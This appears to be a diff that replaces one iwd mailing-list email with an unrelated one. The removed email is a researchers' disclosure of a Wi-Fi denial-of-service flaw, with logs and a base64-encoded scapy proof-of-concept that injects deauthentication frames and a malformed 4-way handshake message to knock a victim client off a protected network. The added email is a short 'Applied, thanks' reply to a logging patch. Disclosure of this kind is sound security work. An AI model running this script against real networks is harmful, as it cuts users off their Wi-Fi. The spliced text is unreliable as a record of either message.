@@ -1,134 +1,35 @@
-Content-Type: multipart/mixed; boundary="===============8581418431110559694=="
+Content-Type: multipart/mixed; boundary="===============6948893765745763358=="
 MIME-Version: 1.0
-From: Domien Schepers <schepers.d at northeastern.edu>
+From: Denis Kenzior <denkenz at gmail.com>
 To: iwd at lists.01.org
-Subject: denial-of-service vulnerability in 4-way handshake
-Date: Fri, 06 May 2022 14:00:41 +0000
-Message-ID: <22F152D7-6A5D-4AEA-B2EB-D3C54462409F@northeastern.edu>
+Subject: Re: [PATCH] station: only log station_autoconnect_start if
+ autoconnecting
+Date: Thu, 10 Feb 2022 16:21:49 -0600
+Message-ID: <21bce403-d320-11b8-6f0c-92b9dc87b181@gmail.com>
+In-Reply-To: 20220210205400.865795-1-prestwoj@gmail.com
 
---===============8581418431110559694==
+--===============6948893765745763358==
 Content-Type: text/plain; charset="utf-8"
 MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
 
-We discovered a denial-of-service vulnerability that allows an adversary to=
- forcibly disconnect the IWD client from a protected Wi-Fi network even whe=
-n Wi-Fi Management Frame Protection (MFP) is being used. The problem is tha=
-t the reception of an unprotected and invalid handshake message 1/4 will ca=
-use the client to disconnect even when MFP is used, resulting in denial-of-=
-service.
+Hi James,
 
-An example of an invalid handshake message 1/4 is one with the key install =
-flag set.
-
-Snippet from the logs:
-
-	src/netdev.c:netdev_unicast_notify() Unicast notification Control Port Fra=
-me(129)
-	src/netdev.c:netdev_control_port_frame_event() =
-
-	src/eapol.c:eapol_handle_ptk_1_of_4() ifindex=3D19
-	4-Way handshake failed for ifindex: 19, reason: 1
-	src/netdev.c:netdev_mlme_notify() MLME notification Del Station(20)
-	src/netdev.c:netdev_link_notify() event 16 on ifindex 19
-	src/netdev.c:netdev_mlme_notify() MLME notification Deauthenticate(39)
-	src/netdev.c:netdev_deauthenticate_event() =
-
-	src/netdev.c:netdev_link_notify() event 16 on ifindex 19
-	src/netdev.c:netdev_mlme_notify() MLME notification Disconnect(48)
-	src/netdev.c:netdev_disconnect_event() =
+On 2/10/22 14:54, James Prestwood wrote:
+> This debug print was before any checks which could bail out prior to
+> autoconnect starting. This was confusing because debug logs would
+> contain multiple "station_autoconnect_start()" prints making you think
+> autoconnect was started several times.
+> ---
+>   src/station.c | 4 ++--
+>   1 file changed, 2 insertions(+), 2 deletions(-)
+> =
 
 
-We confirmed the attack against versions 1.24, 1.25, 1.26, 1.27. See the at=
-tachment for our proof-of-concept code to reproduce the issue.
+Applied, thanks.
 
-A potential solution is to discard the invalid handshake message instead of=
- disconnecting.
+Regards,
+-Denis
 
-This issue was discovered by Domien Schepers (Northeastern University) and =
-Mathy Vanhoef (imec-DistriNet, KU Leuven).
-
-
---===============8581418431110559694==
-Content-Type: text/x-python-script
-MIME-Version: 1.0
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="iwd-disconnect-handshake.py"
-
-IyBDb3B5cmlnaHQgKEMpIDIwMjIsIERvbWllbiBTY2hlcGVycy4NCiMgQlNEIDItQ2xhdXNlIExp
-Y2Vuc2UuDQpmcm9tIHNjYXB5LmFsbCBpbXBvcnQgKg0KZnJvbSBzY2FweS5jb250cmliLndwYV9l
-YXBvbCBpbXBvcnQgV1BBX2tleQ0KaW1wb3J0IGFyZ3BhcnNlDQoNCiMjIyMjIyMjIyMjIyMjIyMj
-IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyBJbnN0cnVjdGlvbnMgIyMj
-IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KIyBFeGFtcGxlIENvbW1hbmRzOg0KIyA+
-IHB5dGhvbiBpd2QtZGlzY29ubmVjdC1oYW5kc2hha2UucHkgLS1pZmFjZSB3bGFuMCAtLWJzc2lk
-IGFhOmFhOmFhOmFhOmFhOmFhIC0tY2xpZW50IGJiOmJiOmJiOmJiOmJiOmJiIC0tZGVhdXRoDQoj
-ID4gcHl0aG9uIGl3ZC1kaXNjb25uZWN0LWhhbmRzaGFrZS5weSAtLWlmYWNlIHdsYW4wIC0tYnNz
-aWQgYWE6YWE6YWE6YWE6YWE6YWEgLS1jbGllbnQgYmI6YmI6YmI6YmI6YmI6YmIgLS1oYW5kc2hh
-a2UNCg0KIyBXaGVyZSAtLWlmYWNlIGlzIHlvdXIgYWR2ZXJzYXJpYWwgaWZhY2UgaW4gbW9uaXRv
-ciBtb2RlLCAtLWJzc2lkIGlzIHRoZSBuZXR3b3JrJ3MgQlNTSUQsDQojIGFuZCAtLWNsaWVudCB0
-aGUgdmljdGltJ3MgTUFDIGFkZHJlc3MuDQoNCiMgVGhlIC0tZGVhdXRoIG9wdGlvbiBjYW4gYmUg
-dXNlZCB0byB2ZXJpZnkgdGhlIG5ldHdvcmsgaXMgZW5mb3JjaW5nIFdpLUZpIE1GUC4gSWYgeWVz
-LA0KIyB0aGUgdW5wcm90ZWN0ZWQgZGVhdXRoZW50aWNhdGlvbiBmcmFtZSB3aWxsIGJlIGRpc2Nh
-cmRlZC4NCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIw0KIyMjIE5vdGVzICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-Iw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0K
-DQojIFlvdXIgaW50ZXJmYWNlIG11c3QgYmUgc2V0IHRvIG1vbml0b3IgbW9kZSBvbiB0aGUgYXBw
-cm9yaWF0ZSBjaGFubmVsLiBGb3IgZXhhbXBsZToNCiMgPiBpZmNvbmZpZyB3bGFuMCBkb3duDQoj
-ID4gaXcgd2xhbjAgc2V0IG1vbml0b3IgY29udHJvbA0KIyA+IGlmY29uZmlnIHdsYW4wIHVwDQoj
-ID4gaXcgZGV2IHdsYW4wIHNldCBjaGFubmVsIDENCiMgPiBpdyB3bGFuMCBpbmZvDQoNCiMgRXhh
-bXBsZSBJV0QgY29tbWFuZCB3aXRoIGRlYnVnIG91dHB1dDoNCiMgPiBzdWRvIHNyYy9pd2QgLWkg
-d2xhbjAgLWQNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIyMjIw0KIyMjIFRyb3VibGVzaG9vdGluZyAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-Iw0KDQojIC0gVmVyaWZ5IHlvdXIgaW50ZXJmYWNlIGlzIHNldCB0byBtb25pdG9yIG1vZGUgb24g
-dGhlIGFwcHJvcHJpYXRlIGNoYW5uZWwuDQojIC0gVmVyaWZ5IHlvdXIgbG9ncyB0byBzZWUgaWYg
-dGhlIHZpY3RpbSBjbGllbnQgcmVjZWl2ZXMgb3VyIGFkdmVyc2FyaWFsIGZyYW1lcy4NCiMgLSBP
-cGVuIFdpcmVzaGFyayB0byBpbnZlc3RpZ2F0ZS4gRmlsdGVyIGZvciBkZWF1dGhlbnRpY2F0aW9u
-IGZyYW1lczoNCiMgICB3bGFuLmZjLnR5cGVfc3VidHlwZT09MHgwMDBjDQojICAgRmlsdGVyIGZv
-ciA0LVdheSBIYW5kc2hha2UgMS80IGZyYW1lczoNCiMgICB3bGFuX3JzbmFfZWFwb2wua2V5ZGVz
-Lm1zZ25yPT0xDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIyMjIyMNCiMjIyBDb2RlICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMjIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
-IyMNCg0KZGVmIGluamVjdF9kZWF1dGgoIGlmYWNlICwgYnNzaWQgLCBjbGllbnQgKToNCgkiIiJJ
-bmplY3QgYW4gdW5wcm90ZWN0ZWQgZGVhdXRoZW50aWNhdGlvbiB0byB2ZXJpZnkgV2ktRmkgTUZQ
-IGlzIGVuZm9yY2VkLiIiIg0KCXByaW50KCJbK10gSW5qZWN0aW5nIGFuIHVucHJvdGVjdGVkIGRl
-YXV0aGVudGljYXRpb24uIikNCgkNCglmcmFtZSA9IERvdDExKCkvRG90MTFEZWF1dGgocmVhc29u
-PTIpICMgQXV0aGVudGljYXRpb24gRXhwaXJlZC4NCglmcmFtZVtEb3QxMV0uYWRkcjEgPSBjbGll
-bnQNCglmcmFtZVtEb3QxMV0uYWRkcjIgPSBic3NpZA0KCWZyYW1lW0RvdDExXS5hZGRyMyA9IGJz
-c2lkDQoJDQoJIyBUcmFuc21pdC4NCglwcmludCgiWytdICIgKyBmcmFtZS5zdW1tYXJ5KCkpDQoJ
-c2VuZHAoUmFkaW9UYXAoKS9mcmFtZSwgaWZhY2U9aWZhY2UsIHZlcmJvc2U9RmFsc2UpDQoJDQpk
-ZWYgaW5qZWN0X2hhbmRzaGFrZSggaWZhY2UgLCBic3NpZCAsIGNsaWVudCApOg0KCSIiIkluamVj
-dCA0LVdheSBIYW5kc2hha2UgMS80IHdpdGggaW52YWxpZCBmbGFncy4iIiINCglwcmludCgiWytd
-IEluamVjdGluZyA0LVdheSBIYW5kc2hha2UgMS80IHdpdGggaW52YWxpZCBmbGFncy4iKQ0KCQ0K
-CWZyYW1lID0gRG90MTEoKQ0KCWZyYW1lW0RvdDExXS5hZGRyMSA9IGNsaWVudA0KCWZyYW1lW0Rv
-dDExXS5hZGRyMiA9IGJzc2lkDQoJZnJhbWVbRG90MTFdLmFkZHIzID0gYnNzaWQNCgkNCgkjIENv
-bnN0cnVjdCBhIDQtV2F5IEhhbmRzaGFrZSBNZXNzYWdlIDEvNC4NCgllYXBvbCA9IFdQQV9rZXko
-IGRlc2NyaXB0b3JfdHlwZSA9IDIsDQoJCSMgTk9URTogRXhwZWN0ZWQga2V5X2luZm8gaXMgMHgw
-MDhhLCB3aXRoIHRoZSBpbnN0YWxsIGZsYWcgdGhpcyBiZWNvbWVzIDB4MDBjYS4NCgkJa2V5X2lu
-Zm8gPSAweDAwY2EsICMgSW5jbHVkZXMgYW4gaW52YWxpZCBpbnN0YWxsIGZsYWchDQoJCXJlcGxh
-eV9jb3VudGVyID0gc3RydWN0LnBhY2soIj5RIiwgMTAwKSkgIyBTb21lIGFyYml0cmFyeSBpbmNy
-ZWFzZWQgY291bnRlci4NCglmcmFtZSAvPSBMTEMoKS9TTkFQKCkvRUFQT0wodmVyc2lvbj0iODAy
-LjFYLTIwMDQiLCB0eXBlPSJFQVBPTC1LZXkiKS9lYXBvbA0KCQ0KCSMgVHJhbnNtaXQuDQoJcHJp
-bnQoIlsrXSAiICsgZnJhbWUuc3VtbWFyeSgpKQ0KCXNlbmRwKFJhZGlvVGFwKCkvZnJhbWUsIGlm
-YWNlPWlmYWNlLCB2ZXJib3NlPUZhbHNlKQ0KCQ0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoN
-Cg0KCSMgQXJndW1lbnQgUGFyc2VyLg0KCXBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2Vy
-KCkNCglwYXJzZXIuYWRkX2FyZ3VtZW50KCAnLS1pZmFjZScgLCBkZXN0PSdpZmFjZScgLCByZXF1
-aXJlZD1UcnVlICwgXA0KCQloZWxwPSdJbnRlcmZhY2UgaW4gbW9uaXRvciBtb2RlLicgKQ0KCXBh
-cnNlci5hZGRfYXJndW1lbnQoICctLWJzc2lkJyAsIGRlc3Q9J2Jzc2lkJyAsIHJlcXVpcmVkPVRy
-dWUgLCBcDQoJCWhlbHA9J05ldHdvcmsgQlNTSUQgaW4geHg6eHg6eHg6eHg6eHg6eHggZm9ybWF0
-LicgKQ0KCXBhcnNlci5hZGRfYXJndW1lbnQoICctLWNsaWVudCcgLCBkZXN0PSdjbGllbnQnICwg
-cmVxdWlyZWQ9VHJ1ZSAsIFwNCgkJaGVscD0nQ2xpZW50IE1BQyBpbiB4eDp4eDp4eDp4eDp4eDp4
-eCBmb3JtYXQuJyApDQoJcGFyc2VyLmFkZF9hcmd1bWVudCggJy0tZGVhdXRoJyAsIGFjdGlvbj0n
-c3RvcmVfdHJ1ZScgLCByZXF1aXJlZD1GYWxzZSAsIFwNCgkJaGVscD0nVmVyaWZ5IFdpLUZpIE1G
-UCBpcyBlbmZvcmNlZCB3aXRoIGFuIHVucHJvdGVjdGVkIGRlYXV0aGVudGljYXRpb24uJyApDQoJ
-cGFyc2VyLmFkZF9hcmd1bWVudCggJy0taGFuZHNoYWtlJyAsIGFjdGlvbj0nc3RvcmVfdHJ1ZScg
-LCByZXF1aXJlZD1GYWxzZSAsIFwNCgkJaGVscD0nUnVuIHRoZSBJbnZhbGlkIDQtV2F5IEhhbmRz
-aGFrZSAxLzQgYXR0YWNrLicgKQ0KCWFyZ3MgPSBwYXJzZXIucGFyc2VfYXJncygpDQoJDQoJIyBS
-dW4uDQoJaWYgYXJncy5kZWF1dGg6DQoJCWluamVjdF9kZWF1dGgoIGFyZ3MuaWZhY2UgLCBhcmdz
-LmJzc2lkICwgYXJncy5jbGllbnQpDQoJZWxpZiBhcmdzLmhhbmRzaGFrZToNCgkJaW5qZWN0X2hh
-bmRzaGFrZSggYXJncy5pZmFjZSAsIGFyZ3MuYnNzaWQgLCBhcmdzLmNsaWVudCApDQoJZWxzZToN
-CgkJcHJpbnQoIlstXSBQbGVhc2Ugc3BlY2lmeSBhbiBvcHRpb24uIikNCg==
-
---===============8581418431110559694==--
+--===============6948893765745763358==--
 
